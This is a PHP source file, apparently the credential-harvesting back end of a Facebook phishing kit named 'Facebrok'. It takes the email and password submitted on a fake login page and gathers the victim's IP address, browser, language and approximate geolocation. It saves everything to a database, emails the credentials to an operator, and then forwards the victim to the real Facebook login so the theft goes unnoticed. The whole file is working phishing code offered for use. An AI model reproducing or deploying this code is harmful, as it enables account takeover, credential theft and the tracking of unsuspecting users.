<?php
// RedToor
// Project Facebrok 
// Configuration -------------------------------------------------------------------------------------------------------
error_reporting(0);
include ("croak/config.php");
//----------------------------------------------------------------------------------------------------------------------
$password=$_POST['password'];
$geo=$_POST['holy'];

// Data ----------------------------------------------------------------------------------------------------------------
$email=$_POST['email'];
//----------------------------------------------------------------------------------------------------------------------
// Data Verification
if ($email=='' or $password=='') {header("Location: login.php?login_attempt=1");} else {
//----------------------------------------------------------------------------------------------------------------------
// Connections
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());

//----------------------------------------------------------------------------------------------------------------------
//  Getting IP ---------------------------------------------------------------------------------------------------------
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "Unknow")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "Unknow")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "Unknow")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "Unknow")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "Unknow"; 
// ----------------------------------------------------------------------------------------------------------------------
//  Getting Time --------------------------------------------------------------------------------------------------------
	$dato=date(DATE_RFC2822);  
// ----------------------------------------------------------------------------------------------------------------------
//  Getting All ---------------------------------------------------------------------------------------------------------
	$g=unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR'].''));
	$data.="<br>Country Name       : ".$g['geoplugin_countryName'].    "<br>";
    $data.="Region             : ".$g['geoplugin_region'].         "<br>";
    $data.="City               : ".$g['geoplugin_city'].           "<br>";
    $data.="Longitude ,no exact: ".$g['geoplugin_longitude'].      "<br>";
    $data.="Latitude  ,no exact: ".$g['geoplugin_latitude'].       "<br>";
	$data.="Agent              : ".$_SERVER['HTTP_USER_AGENT']."<br>";
	$data.="Ip                 : ".$_SERVER['REMOTE_ADDR']."<br>";
	$data.="Port               : ".$_SERVER['REMOTE_PORT']."<br>";
	$data.="Url                : ".$_SERVER['REQUEST_URI']."<br>";
	$data.="Lang               : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."<br>";
	$data.=$geo;

// ----------------------------------------------------------------------------------------------------------------------
// Save and email alert
$sql2=mysql_query("SELECT * FROM methods WHERE id=2");
$row2=mysql_fetch_array($sql2);
$emails=$row2['other']; 
if($emails!=""){
	$body ="Mail :".$email;
	$body.="Pass :".$password;
	$body.="Ip   :".$ip;
	$body.="Info :".$dato;
	$body.="Date :".$data;
$header = 'From: alert@facebrok.pj' . "\r\n" .
          'Reply-To: '.$emails.'' . "\r\n" .
          'X-Mailer: PHP/' . phpversion();
mail($emails, "New Croaked", $body, $header);
}

$sql=mysql_query("INSERT INTO croak (Email, Password, Ip, Dato, info) VALUES ('$email','$password','$ip','$dato','$data')") or die("Failed".mysql_errno());
$red=mysql_query ("SELECT * FROM methods" ) or die ('Failed Consult: '.mysql_error());
//-----------------------------------------------------------------------------------------------------------------------
// Escaping -------------------------------------------------------------------------------------------------------------
$red=mysql_fetch_assoc($red);
$var=$red['value'];
if ($var=="post"){
?>
<body onload="document.forms['auto'].submit();">
<form id="auto" name="auto" method="post" action="https://www.facebook.com/login.php?login_attempt=1">
<input type="hidden" name="email" value="<?php echo"$email";?>">
<input type="hidden" name="pass" value="<?php echo"$password";?>">
</body>
<?php
} else {
header("location:".$red['value']."");
}}
// END ------------------------------------------------------------------------------------------------------------------
?>